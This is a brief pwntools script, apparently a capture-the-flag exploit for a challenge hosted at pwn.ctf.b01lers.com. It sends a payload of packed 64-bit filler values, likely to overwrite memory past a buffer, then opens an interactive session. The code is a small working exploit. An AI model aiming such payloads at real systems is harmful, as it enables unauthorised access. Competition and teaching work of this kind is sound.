from pwn import *


#p=process("dfv")
p=remote("pwn.ctf.b01lers.com",1001)
payload=""
payload+=p64(0x4141414141414141)
payload+=p64(0x4242424242424242)
payload+=p64(0x0303030303030303)
p.sendline(payload)
p.interactive()

